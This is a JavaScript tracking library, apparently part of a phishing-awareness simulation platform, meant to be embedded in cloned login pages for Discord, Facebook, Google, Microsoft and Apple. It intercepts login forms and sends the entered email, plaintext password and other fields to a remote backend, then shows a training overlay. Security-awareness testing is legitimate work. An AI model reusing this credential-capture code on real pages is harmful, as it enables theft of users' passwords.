/**
 * Universal Phishing Clone Tracking Library
 * 
 * Include this script in any phishing clone to automatically handle:
 * - Page view tracking
 * - Form submission tracking  
 * - Exit tracking
 * - Credential collection
 * 
 * Usage:
 * 1. Include this script: <script src="path/to/universal-tracking.js"></script>
 * 2. Configure: PhishingTracker.configure({ cloneType: 'discord', backendUrl: 'https://your-backend.com' });
 * 3. Initialize: PhishingTracker.init();
 */

class PhishingTracker {
    constructor() {
        this.config = {
            backendUrl: null,
            cloneType: 'unknown',
            autoTrack: true,
            trackForms: true,
            trackExits: true,
            debug: false
        };
        
        this.urlParams = new URLSearchParams(window.location.search);
        this.trackingData = {
            campaignId: this.urlParams.get('campaign_id'),
            trackingToken: this.urlParams.get('t'),
            scenarioId: this.urlParams.get('scenario_id')
        };
        
        this.timeOnPage = Date.now();
        this.hasSubmitted = false;
        this.isInitialized = false;
    }
    
    /**
     * Configure the tracker
     * @param {Object} options - Configuration options
     * @param {string} options.cloneType - Type of clone (e.g., 'discord', 'facebook')
     * @param {string} options.backendUrl - URL of the backend API
     * @param {boolean} options.autoTrack - Auto-track page views (default: true)
     * @param {boolean} options.trackForms - Auto-track form submissions (default: true)
     * @param {boolean} options.trackExits - Track page exits (default: true)
     * @param {boolean} options.debug - Enable debug logging (default: false)
     */
    configure(options = {}) {
        this.config = { ...this.config, ...options };
        
        // Auto-detect backend URL if not provided
        if (!this.config.backendUrl) {
            this.config.backendUrl = window.location.hostname === 'localhost' 
                ? 'http://localhost:5001' 
                : 'https://attacksim.onrender.com';
        }
        
        if (this.config.debug) {
            console.log('PhishingTracker configured:', this.config);
            console.log('Tracking parameters:', this.trackingData);
        }
    }
    
    /**
     * Initialize the tracker
     */
    init() {
        if (this.isInitialized) {
            console.warn('PhishingTracker already initialized');
            return;
        }
        
        this.isInitialized = true;
        
        if (this.config.debug) {
            console.log('Initializing PhishingTracker...');
        }
        
        // Track page view if enabled
        if (this.config.autoTrack) {
            this.trackPageView();
        }
        
        // Set up form tracking if enabled
        if (this.config.trackForms) {
            this.setupFormTracking();
        }
        
        // Set up exit tracking if enabled
        if (this.config.trackExits) {
            this.setupExitTracking();
        }
        
        if (this.config.debug) {
            console.log('PhishingTracker initialized successfully');
        }
    }
    
    /**
     * Track page view
     */
    async trackPageView() {
        try {
            const response = await this.makeRequest('/api/track-view', {
                campaign_id: this.trackingData.campaignId,
                tracking_token: this.trackingData.trackingToken,
                scenario_id: this.trackingData.scenarioId,
                user_agent: navigator.userAgent,
                page_url: window.location.href,
                clone_type: this.config.cloneType,
                referrer: document.referrer,
                timestamp: new Date().toISOString()
            });
            
            if (this.config.debug) {
                console.log('Page view tracked:', response);
            }
        } catch (error) {
            console.error('Failed to track page view:', error);
        }
    }
    
    /**
     * Track form submission
     * @param {Object} formData - Form data to track
     * @param {string} formData.email - Email/username entered
     * @param {string} formData.password - Password entered
     * @param {Object} additionalData - Any additional form fields
     */
    async trackSubmission(formData, additionalData = {}) {
        try {
            this.hasSubmitted = true;
            
            const response = await this.makeRequest('/api/track-submission', {
                email: formData.email,
                password: formData.password,
                campaign_id: this.trackingData.campaignId,
                tracking_token: this.trackingData.trackingToken,
                scenario_id: this.trackingData.scenarioId,
                user_agent: navigator.userAgent,
                page_url: window.location.href,
                clone_type: this.config.cloneType,
                referrer: document.referrer,
                timestamp: new Date().toISOString(),
                additional_data: additionalData
            });
            
            if (this.config.debug) {
                console.log('Submission tracked:', response);
            }
            
            return response;
        } catch (error) {
            console.error('Failed to track submission:', error);
            return { success: false, error: error.message };
        }
    }
    
    /**
     * Track when user ignores/exits without submitting
     */
    async trackIgnore() {
        if (this.hasSubmitted || (!this.trackingData.campaignId && !this.trackingData.trackingToken)) {
            return;
        }
        
        const timeSpent = Math.round((Date.now() - this.timeOnPage) / 1000);
        
        try {
            // Use sendBeacon for reliable exit tracking
            const data = JSON.stringify({
                campaign_id: this.trackingData.campaignId,
                tracking_token: this.trackingData.trackingToken,
                scenario_id: this.trackingData.scenarioId,
                time_spent: timeSpent,
                clone_type: this.config.cloneType
            });
            
            navigator.sendBeacon(`${this.config.backendUrl}/api/track-ignore`, data);
            
            if (this.config.debug) {
                console.log('Ignore tracked, time spent:', timeSpent);
            }
        } catch (error) {
            console.error('Failed to track ignore:', error);
        }
    }
    
    /**
     * Set up automatic form tracking
     */
    setupFormTracking() {
        // Find forms with password fields
        const forms = document.querySelectorAll('form');
        
        forms.forEach(form => {
            const passwordField = form.querySelector('input[type="password"]');
            const emailField = form.querySelector('input[type="email"]') || 
                             form.querySelector('input[name*="email"]') ||
                             form.querySelector('input[name*="username"]') ||
                             form.querySelector('input[name*="user"]');
            
            if (passwordField && emailField) {
                form.addEventListener('submit', async (event) => {
                    event.preventDefault();
                    
                    const formData = {
                        email: emailField.value,
                        password: passwordField.value
                    };
                    
                    // Collect additional form data
                    const additionalData = {};
                    const formInputs = form.querySelectorAll('input, select, textarea');
                    formInputs.forEach(input => {
                        if (input.type !== 'password' && input.name && input.value) {
                            additionalData[input.name] = input.value;
                        }
                    });
                    
                    // Track the submission
                    const result = await this.trackSubmission(formData, additionalData);
                    
                    // Show educational message if available
                    if (result && result.educational_message) {
                        this.showEducationalMessage(result.educational_message);
                    } else {
                        this.showEducationalMessage("This was a phishing simulation! Never enter your real credentials on suspicious sites.");
                    }
                });
                
                if (this.config.debug) {
                    console.log('Form tracking set up for form:', form);
                }
            }
        });
    }
    
    /**
     * Set up exit tracking
     */
    setupExitTracking() {
        window.addEventListener('beforeunload', () => this.trackIgnore());
        window.addEventListener('pagehide', () => this.trackIgnore());
        
        if (this.config.debug) {
            console.log('Exit tracking set up');
        }
    }
    
    /**
     * Show educational message to user
     * @param {string} message - Educational message to display
     */
    showEducationalMessage(message) {
        // Create educational overlay
        const overlay = document.createElement('div');
        overlay.className = 'phishing-education-overlay';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        `;
        
        overlay.innerHTML = `
            <div style="
                background: white;
                padding: 30px;
                border-radius: 10px;
                max-width: 500px;
                margin: 20px;
                text-align: center;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            ">
                <div style="font-size: 48px; margin-bottom: 20px;">⚠️</div>
                <h2 style="color: #d73527; margin: 0 0 20px 0;">Security Awareness Alert</h2>
                <p style="color: #333; font-size: 16px; line-height: 1.5; margin-bottom: 20px;">${message}</p>
                <div style="background: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 20px; text-align: left;">
                    <h3 style="color: #495057; margin: 0 0 15px 0; font-size: 18px;">Remember:</h3>
                    <ul style="color: #6c757d; margin: 0; padding-left: 20px;">
                        <li style="margin-bottom: 8px;">Always check the URL carefully</li>
                        <li style="margin-bottom: 8px;">Look for HTTPS and proper certificates</li>
                        <li style="margin-bottom: 8px;">Never enter credentials on suspicious links from emails</li>
                        <li style="margin-bottom: 8px;">When in doubt, navigate to the site directly</li>
                    </ul>
                </div>
                <button onclick="this.parentElement.parentElement.remove()" style="
                    background: #007bff;
                    color: white;
                    border: none;
                    padding: 12px 24px;
                    border-radius: 5px;
                    font-size: 16px;
                    cursor: pointer;
                ">I Understand - Continue Learning</button>
            </div>
        `;
        
        document.body.appendChild(overlay);
    }
    
    /**
     * Make API request to backend
     * @param {string} endpoint - API endpoint
     * @param {Object} data - Data to send
     */
    async makeRequest(endpoint, data) {
        const response = await fetch(`${this.config.backendUrl}${endpoint}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        return await response.json();
    }
}

// Create global instance
window.PhishingTracker = new PhishingTracker();

// Auto-initialize if DOM is already loaded
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        // Auto-detect clone type from URL or domain
        const hostname = window.location.hostname;
        let cloneType = 'unknown';
        
        if (hostname.includes('discord')) cloneType = 'discord';
        else if (hostname.includes('facebook')) cloneType = 'facebook';
        else if (hostname.includes('google')) cloneType = 'google';
        else if (hostname.includes('microsoft')) cloneType = 'microsoft';
        else if (hostname.includes('apple')) cloneType = 'apple';
        
        // Auto-configure and initialize
        window.PhishingTracker.configure({ cloneType });
    });
} else {
    // DOM already loaded, configure immediately
    const hostname = window.location.hostname;
    let cloneType = 'unknown';
    
    if (hostname.includes('discord')) cloneType = 'discord';
    else if (hostname.includes('facebook')) cloneType = 'facebook';
    else if (hostname.includes('google')) cloneType = 'google';
    else if (hostname.includes('microsoft')) cloneType = 'microsoft';
    else if (hostname.includes('apple')) cloneType = 'apple';
    
    window.PhishingTracker.configure({ cloneType });
}

/**
 * Usage Examples:
 * 
 * Basic usage (auto-initialization):
 * Just include the script and it will auto-detect and track
 * 
 * Manual configuration:
 * PhishingTracker.configure({
 *     cloneType: 'discord',
 *     backendUrl: 'https://your-backend.com',
 *     debug: true
 * });
 * PhishingTracker.init();
 * 
 * Manual tracking:
 * PhishingTracker.trackSubmission({
 *     email: 'user@example.com',
 *     password: 'password123'
 * }, { deviceId: 'abc123' });
 */ 